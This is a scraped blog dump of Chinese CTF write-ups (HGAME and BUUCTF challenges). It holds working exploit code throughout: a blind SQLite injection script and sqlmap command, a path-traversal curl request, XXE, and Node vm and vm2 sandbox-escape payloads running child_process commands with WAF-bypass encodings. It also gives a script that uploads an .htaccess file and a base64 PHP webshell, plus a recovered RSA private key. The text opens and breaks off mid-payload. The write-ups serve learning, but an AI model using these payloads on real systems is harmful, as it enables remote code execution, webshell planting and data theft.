XamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OE fZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQ eWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEs z6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzA tWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0c ZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208D aIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUG gMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn 6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;V w03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI 38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGu J+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1 h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F; vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCy fC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7G U1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9c zerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91I kjfB7w&#x3D;&#x3D; -----END PUBLIC KEY----- 再用公钥求私钥 得到私钥 -----BEGIN RSA PRIVATE KEY----- MIIHOgIBAAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPv ZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZ nzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5F OGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYk m6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa 1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA &#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUq dRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipU nLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795C S9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn 15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS 80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUS BpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSo TyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7 updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9 HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grn xTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8N pddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICG wQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvk PtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRK Ub+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36 cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7wIJALW5aE5wHIlPAoIBAQCo tra8EGmcotwH&#x2F;ZDGjC4Z8ogha4CMuHNdkeIBwjStJor8O0NCarLdkQT6NMtSUYBN 5lcKx7upYPmL7ZPVnmcV9le23PFZpVSgILJO5e85BwwdJVhToam3u8uEh47B2enI FkWTMO18zvYBFrLqB8VgUfsQN4isa5HbQFI9T9MDe0TugTNnLC6kx6aKpVBsUqmk aUOzN586tD0Ppo6kW570+4GdepUqKyGjnz80d2fwStarw8Ez67IKEhOSDEiAyuoN duZRC4gZVfhHX&#x2F;umElWVmtfbtJGHmbCf2+g&#x2F;3PZy65f5qNqwGHxd3zU5tku2EVT9 h01jhuwEZLuinp3L1t6pAoIBAQC8uh&#x2F;FzJl8zlzGon3u0V0SSgjI9oWStsp2K6Fl IDEWTAVMdYQZCOwxObcVwivwz8ovDMmvoA3hKBh+8rzmJeYJ3MyubkCV+FNo&#x2F;y1X DzJdemGbAyPUnEeCgOEbJrqHqzk1W0d6oLtr6HuSIswK4yNglsLWM+16S+WQEKi2 E1yuzC+uq279ezOx39FbXGxlLDSyKOb9oJXVuZWnhCyJA27d&#x2F;cYDlmSQ0JvX3xiD fG10MYFOSqpDsNS7LLOf+LK8WRH4m6iFQHcX7sgs6HH48ACig+agyRSJCaN&#x2F;b&#x2F;PQ 6o99jpkCmYSo2vO8qScAZFbEucrjtOkOtWOBhc9xrSbPuWvHAgkAtbloTnAciU8C CQC1uWhOcByJTwKCAQAl77&#x2F;PElSLSo1fNYoMKafuVi48Fjx0iUntMVmcNB7Xe9hV CAIojVVQu2ux1w&#x2F;91oMgui8wbN6dbZg&#x2F;cd0CgLtxfgwhTjX75CxB97oahAkxuP3L BeqOHx2uy6B6TNfFHR76srqhQxgz9MWW8IUstpNnBV91CtOYyRBQsCuKchS+Asb+ Z3+W08eWjKNN68jPBohKjD15FYy4&#x2F;W03t2NBtKNb7UoLynBTni&#x2F;Bjq86ZWNOUG3v gPuI48t&#x2F;Px2F4wS51wfzGZDfutBNM2dO+a3DcwNGctqkxFriQuD0tQkYtei6R92f lUtMgGyxmfNgmbdycrcjDislpPUj9+NkD1ce2f28 -----END RSA PRIVATE KEY----- 再利用私钥求pq 得到pq之后找个rsa脚本带进去就行 Block Cipher加密脚本 给了三个值 iv = b&#39;Up\\x14\\x98r\\x14%\\xb9&#39; key = b&#39;\\r\\xe8\\xb86\\x9c33^&#39; parts = [b&#39;0\\xff\\xcd\\xc3\\x8b\\T\\x8b&#39;, b&#39;RT\\x1e\\x89t&amp;\\x17\\xbd&#39;, b&#39;\\x1a\\xee\\x8d\\xd6\\x9b&gt;w\\x8c&#39;, b&#39;9CT\\xb3^pF\\xd0&#39;] 加密的逻辑大致是将flag每八个字符一组，不够的在末尾加上chr(len(该段长度))重复一定次数凑够八个字符,同时构造有八组数据的iv和key变量，并与flag分成的组进行一次异或操作，将异或操作后的内容作为下一次异或操作的iv。同时将异或后的内容放入results列表中 其中返回值的内容都是可迭代类型，所以要利用for循环才能读出里面的内容 八个一组的数字 也就相当于第一组48 = 85^13^ord(flag的第一个字符)即ord(&#39;h&#39;) 经过测试这个也能逆推 所以只要根据加密脚本将flag变为给的parts里的内容就能分段解密 贴一下其他师傅写的解码脚本（我是菜b import operator import gmpy2 from Crypto.Util.number import long_to_bytes import random from functools import reduce iv &#x3D; b&#39;Up\\x14\\x98r\\x14%\\xb9&#39; key &#x3D; b&#39;\\r\\xe8\\xb86\\x9c33^&#39; parts &#x3D; [b&#39;0\\xff\\xcd\\xc3\\x8b\\\\T\\x8b&#39;, b&#39;RT\\x1e\\x89t&amp;\\x17\\xbd&#39;, b&#39;\\x1a\\xee\\x8d\\xd6\\x9b&gt;w\\x8c&#39;, b&#39;9CT\\xb3^pF\\xd0&#39;] results &#x3D; [] def xor(a, b): assert len(a) &#x3D;&#x3D; len(b) return bytes(map(operator.xor, a, b)) def decrypt(): for index, part in enumerate(parts): results.append(reduce(xor, [part, iv if index &#x3D;&#x3D; 0 else parts[index - 1], key])) decrypt() print(results) WEBSecurityCenter看一下这个路径 再结合 猜测是twig的模板注入 参考链接 https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/ cat应该是被过滤了，可以用tac看一下 把含有hgame内容的字符串也过滤了，尝试逆向输出 成功，拿到flag Vidar shop demo看这个描述就像支付逻辑漏洞 先随便注册个账户进入 看看商店，flag要一万，我们只有九千九百九十九 先买个徽章试试 发现购买的徽章如果删除，购买花费的钱也会返还，所以试试再开一个网页，同时删除徽章 成功大于一万了，买个flag LoginMe*sql注入，给的hint很明显就是sql语句 但是因为平常的题都是mysql的，这个是 sqlite，所以只试出了注入点，其他的就没注 sqlite因为其比较简易每个db文件就是一个数据库，所以不存在information_schema数据库，但存在类似作用的表sqlite_master。 该表记录了该库下的所有表，索引，表的创建sql等所以我们可以通过此读取数据，常见语句如下。 1 读取表名：select group_concat(name) from sqlite_master where type&#x3D;&#39;table&#39; 2 读取字段：select group_concat(sql) from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;表名&#39; 看看表名 证明确实能注，可以写个脚本 反正最后表名是uuussseeerrrsss 后边的脚本（手注太慢了 import requests url &#x3D; &quot;http:&#x2F;&#x2F;d51f66203d.login.summ3r.top:60067&#x2F;login&quot; date &#x3D; &#123;&quot;username&quot;:&quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;,&quot;password&quot;:&quot;test&quot;&#125; flag &#x3D; &#39;&#39; for i in range(1,200): for j in range(31,127): #列名 #date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j)) #读数据 date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select group_concat(password) from uuussseeerrrsss),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j)) r &#x3D; requests.post(url,json&#x3D;date); response &#x3D; r.text if &#39;success&#39; in response: flag +&#x3D;chr(j) print(flag) break print(flag) 拿到密码之后登录就行 也可以用sqlmap直接跑 bp抓包之后保存到本地 然后上sqlmap python sqlmap.py -r &quot;D:\\Desktop\\post.txt&quot; --dump --batch --threads 10 --no-cast --flush-session 第四周wpWEBFileSystem又是go语言的题 很明显flag在there may be a flag里但是没法访问到 因为根据main.go里的内容可以看到这个路由被出题人加上了web服务,从而使得我们没法通过直接访问/there may be a flag来获取文件。而是得到/there may be a flag路由的回显。 谷歌找一下ctf里出现过的go语言漏洞 https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ 利用相对路径访问 对于 CONNECT 请求，路径和主机保持不变。 和这道题的考点一模一样，可以仿照其payload仿写一个 curl --path-as-is -X CONNECT http:&#x2F;&#x2F;6a87cb1c66.filesystem.hgame.homeboyc.cn&#x2F;main.go&#x2F;..&#x2F;there_may_be_a_flag Comment*考点：xxe注入 源码： &lt;?php require &#39;.&#x2F;init.php&#39;; require_once &#39;.&#x2F;db.php&#39;; libxml_disable_entity_loader(false); function waf($str): bool &#123; if (preg_match(&#39;&#x2F;file|glob|http|dict|gopher|php|ftp|ssh|phar&#x2F;i&#39;, $str)) &#123; return true; &#125; return false; &#125; function save() &#123; if ($_SERVER[&#39;REQUEST_METHOD&#39;] !&#x3D; &#39;POST&#39;) &#123; echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;wrong method&#39;]); return; &#125; $data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); if (waf($data)) &#123; http_response_code(403); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]); return; &#125; $id &#x3D; $_SESSION[&#39;unique_id&#39;]; $db &#x3D; getDB(); $stmt &#x3D; $db-&gt;prepare(&#39;INSERT INTO comments (sender,content) VALUES (?,?)&#39;); $stmt-&gt;execute([$id, $data]); if ($stmt-&gt;rowCount() !&#x3D; 0) &#123; echo json_encode([&#39;msg&#39; &#x3D;&gt; &#39;success&#39;]); &#125; else &#123; http_response_code(500); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;failed to create records&#39;]); &#125; &#125; function parseXML($str) &#123; $dom &#x3D; new DOMDocument(); try &#123; $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD); &#125; catch (Exception $e) &#123; http_response_code(400); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;invalid xml data&#39;]); die(); &#125; $attrs &#x3D; simplexml_import_dom($dom); if (!isset($attrs-&gt;content)) &#123; http_response_code(400); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;content is empty&#39;]); die(); &#125; if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123; http_response_code(403); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]); die(); &#125; if ($attrs-&gt;sender &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; !preg_match(&#39;&#x2F;admin&#x2F;i&#39;, $str)) &#123; $flag &#x3D; &#39;hgame&#123;xxxxx&#125;&#39;; $attrs-&gt;content &#x3D; $flag; &#125; return $attrs; &#125; function get() &#123; $id &#x3D; $_SESSION[&#39;unique_id&#39;]; $db &#x3D; getDB(); $stmt &#x3D; $db-&gt;prepare(&#39;SELECT * FROM comments WHERE sender&#x3D;?&#39;); $stmt-&gt;execute([$id]); $data &#x3D; $stmt-&gt;fetchAll(); $result &#x3D; []; foreach ($data as $key &#x3D;&gt; $val) &#123; array_push($result, parseXML($val[&#39;content&#39;])); &#125; echo json_encode($result); &#125; switch ($_GET[&#39;action&#39;]) &#123; case &#39;get&#39;: get(); break; case &#39;add&#39;: save(); break; case &#39;info&#39;: echo json_encode([&#39;unique_id&#39; &#x3D;&gt; $_SESSION[&#39;unique_id&#39;]]); break; default: http_response_code(400); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;no such action&#39;]); break; &#125; 先抓个包看看 挺明显的xxe 然后就要满足获取flag的条件 要求sender里有admin但是传入的内容不许有admin 可以尝试data协议 （比赛的时候不知道怎么想的一直想绕过waf读文件。。。忘了data协议 Markdown Online*看一下源码 toUpperCase()是将小写转换为大写，但是这样也绝不可能绕过54gk的这个if判断 利用了try catch但是catch并没有return语句，也就导致try中的代码抛出错误后继续往下执行 所以就要想办法让req.body.password = req.body.password.toUpperCase()报错 对 req.body.password.toUpperCase() 正确的解读方式是：获取 req.body.password对象的 toUpperCase属性，然后把这个属性当作函数来调用。如果这个属性不是函数对象就会抛出错误 所以可以用 &#123;\"username\":\"admin\",\"password\":[\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\"]&#125; 或 &#123;\"username\":\"admin\",\"password\":&#123;\"length\": 16&#125;&#125; 都可以满足第一个if的length==16的判断并让toUpperCase()报错 然后我们访问/md 在这部分 利用markdownit库，并对html标签支持 在提交的地方 在 SubmitController 里，markdown-it 解析出来的 html 代码会被 zombie.js 加载，zobmie.js 在遇到 JavaScript 代码的时候会将其交给 vm 虚拟机执行 而vm模块是存在逃逸的， JavaScript 对象的继承是靠原型链实现的，借助原型链可访问到 vm 沙箱以外的内容，实现 RCE 百度找个vm逃逸的payload this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;) 然后还要绕过waf 利用 JavaScript 的语言特性， obj.contructor 可以变为 obj[&quot;contr&quot;+&quot;uctor&quot;] 的形式， + 也被 ban 了，可以用concat拼接字符串的形式: obj[&quot;constru&quot;.concat(&quot;ctor&quot;)] this 和 process 可以用 eval(&quot;th&quot;+&quot;is&quot;) 的形式绕过。 这里eval和String.fromCharCode都没被过滤，可以用这个绕过 a &#x3D; &quot;document.write(this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;ls &#x2F;&#39;))&quot; b &#x3D; [] for i in range(len(a)): b.append(ord(a[i])) print(b) &lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 116, 104, 105, 115, 46, 95, 95, 112, 114, 111, 116, 111, 95, 95, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 40, 39, 114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115, 39, 41, 40, 41, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 114, 101, 113, 117, 105, 114, 101, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 108, 115, 32, 47, 39, 41, 41))&lt;&#x2F;script&gt; 然后cat /flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"buu刷题记录(二)","slug":"buu刷题记录(二)","date":"2022-01-19T11:00:26.000Z","updated":"2023-05-26T10:53:02.972Z","comments":true,"path":"2022/01/19/buu刷题记录(二)/","link":"","permalink":"https://ethe448.github.io/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/","excerpt":"","text":"[SUCTF 2019]EasyWeb&lt;?php function get_the_flag()&#123; &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125; &#125; $hhh &#x3D; @$_GET[&#39;_&#39;]; if (!$hhh)&#123; highlight_file(__FILE__); &#125; if(strlen($hhh)&gt;18)&#123; die(&#39;One inch long, one inch strong!&#39;); &#125; if ( preg_match(&#39;&#x2F;[\\x00- 0-9A-Za-z\\&#39;&quot;\\&#96;~_&amp;.,|&#x3D;[\\x7F]+&#x2F;i&#39;, $hhh) ) die(&#39;Try something else!&#39;); $character_type &#x3D; count_chars($hhh, 3); if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;); eval($hhh); ?&gt; 前半段是关于文件上传的代码，后半段则是无数字字母rce，猜是要传一个一句话木马上去getshell 但是有个非预期解，利用eval函数查看phpinfo就能找到flag _&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo 预期解： 首先利用eval来执行get_the_flag函数 _&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;;&amp;%ff&#x3D;get_the_flag 再看get_the_flag这个函数 function get_the_flag()&#123; &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#x2F;&#x2F; 表示的是上传临时文件的绝对路径 $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);&#x2F;&#x2F;得到后缀 if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);&#x2F;&#x2F;禁止ph的文件后缀 if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); &#x2F;&#x2F;图片判断 $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125; &#125; 对上传的文件内容进行了过滤，过滤了ph，&lt;?，同时还要求上传的文件文件头为图片类型 所以可以尝试上传htaccess格式或者user.ini格式的文件来解析图片马 .user.ini没用，可能是因为上传的文件夹内没有正常的php文件 偷了个脚本 import requests import base64 htaccess &#x3D; b&quot;&quot;&quot; #define width 1337 #define height 1337 AddType application&#x2F;x-httpd-php .sss php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.sss&quot; &quot;&quot;&quot; shell &#x3D; b&quot;GIF89a11&quot; + base64.b64encode(b&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;) #GIF89后的11是为了满足base64编码 url &#x3D; &quot;http:&#x2F;&#x2F;5da5136e-0e89-4d3c-bac5-a2d4f561663b.node4.buuoj.cn:81&#x2F;?_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag&quot; files &#x3D; &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image&#x2F;jpeg&#39;)&#125; data &#x3D; &#123;&quot;upload&quot;:&quot;Submit&quot;&#125; response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files) print(response.text) files &#x3D; &#123;&#39;file&#39;:(&#39;shell.sss&#39;,shell,&#39;image&#x2F;jpeg&#39;)&#125; response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files) print(response.text) 这里前半段传的是.htaccess，内容就是把.sss后缀的文件当作php进行解析，而且还对当前目录下的shell.sss进行了base64解码读取。 利用auto_append_file来包含b64解码的shell.sss文章，这样往shell.sss里面写b64解密后的马，就可以绕过&lt;?的过滤了。 得到路径之后蚁剑连一下 根目录下 ？？为什么我能直接读，百度的wp都是还要绕过open_basedir的 浅谈几种Bypass open_basedir的方法 | 易学教程 (e-learn.cn) bypass open_basedir的新方法 - 先知社区 (aliyun.com) [NPUCTF2020]ezinclude 抓包，把给的hash值利用get传进去 看一下flflflflag.php 利用伪协议读一下源码 file=php://filter/convert.base64-encode/resource=flflflflag.php 得到 &lt;html&gt; &lt;head&gt; &lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt; window.location.href&#x3D;&quot;404.html&quot;; &lt;&#x2F;script&gt; &lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;&gt; &lt;body&gt; &lt;?php $file&#x3D;$_GET[&#39;file&#39;]; if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123; die(&#39;nonono&#39;); &#125; @include($file); echo &#39;include($_GET[&quot;file&quot;])&#39;; ?&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; index.php &lt;?php include &#39;config.php&#39;; @$name&#x3D;$_GET[&#39;name&#39;]; @$pass&#x3D;$_GET[&#39;pass&#39;]; if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123; echo &#39;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt; window.location.href&#x3D;&quot;flflflflag.php&quot;; &lt;&#x2F;script&gt; &#39;; &#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username&#x2F;password error&quot;; &#125; ?&gt; &lt;html&gt; &lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt; &lt;&#x2F;html&gt; config.php有个假flag。。。 这道题是要利用php临时文件来写马，找到phpinfo里的flag PHP临时文件机制与利用的思考 - linuxsec - 博客园 (cnblogs.com) 关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com) 临时文件的默认存储位置在tmp目录下，扫目录扫出的dir.php显示了tmp目录下的文件 dir.php &lt;?php var_dump(scandir(&#39;&#x2F;tmp&#39;)); ?&gt; 利用python脚本上传文件 import requests from io import BytesIO url&#x3D;&quot;http:&#x2F;&#x2F;77fd686d-4b45-41a8-81f4-0a199419646a.node4.buuoj.cn:81&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&#x2F;&#x2F;使php崩溃，让上传的文件保留在tmp目录中 payload&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot; files&#x3D;&#123; &quot;file&quot;:BytesIO(payload.encode()) &#125; r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)&#x2F;&#x2F;防止重定向 print(r.text) 可以看到上传成功 得到flag [HFCTF2020]JustEscape 访问一下run.php 刚开始以为是php的代码执行，但是试了试没啥反应 然后发现考点是js的vm2逃逸 先用Error().stack看看（js中捕获异常堆栈信息 然后找一下vm2逃逸的payload Breakout in v3.8.3 · Issue #225 · patriksimek/vm2 (github.com) try &#123; Buffer.from(new Proxy(&#123;&#125;, &#123; getOwnPropertyDescriptor()&#123; throw f&#x3D;&gt;f[&#96;&#96;.concat(&#96;constr&#96;,&#96;uctor&#96;)](&#96;&#96;.concat(&#96;return pro&#96;,&#96;cess&#96;))(); &#125; &#125;)); &#125; catch(e) &#123; e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&#96;&#96;.concat(&#96;child_proc&#96;,&#96;ess&#96;)) [&#96;&#96;.concat(&#96;ex&#96;,&#96;ecSync&#96;)](&#96;cat package.json&#96;) &#125; 或 &#39;(&#39; + function()&#123; TypeError.prototype.get_process &#x3D; f&#x3D;&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1; &#125;catch(e)&#123; return e.get_process(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125; &#125;+&#39;)()&#39;; try&#123; console.log(new VM().run(untrusted)); &#125;catch(x)&#123; console.log(x); &#125; 但是直接利用有waf [&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;] 所以通过在关键字字母上加上 ` 进行绕过 &#x2F;run.php?code&#x3D;(()&#x3D;%3E&#123;%20TypeError[[&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;t&#96;,&#96;o&#96;,&#96;t&#96;,&#96;y&#96;,&#96;p&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)][&#96;a&#96;]%20&#x3D;%20f&#x3D;%3Ef[[&#96;c&#96;,&#96;o&#96;,&#96;n&#96;,&#96;s&#96;,&#96;t&#96;,&#96;r&#96;,&#96;u&#96;,&#96;c&#96;,&#96;t&#96;,&#96;o&#96;,&#96;r&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;r&#96;,&#96;e&#96;,&#96;t&#96;,&#96;u&#96;,&#96;r&#96;,&#96;n&#96;,&#96;%20&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))();%20try&#123;%20Object[&#96;preventExtensions&#96;](Buffer[&#96;from&#96;](&#96;&#96;))[&#96;a&#96;]%20&#x3D;%201;%20&#125;catch(e)&#123;%20return%20e[&#96;a&#96;](()&#x3D;%3E&#123;&#125;)[&#96;mainModule&#96;][[&#96;r&#96;,&#96;e&#96;,&#96;q&#96;,&#96;u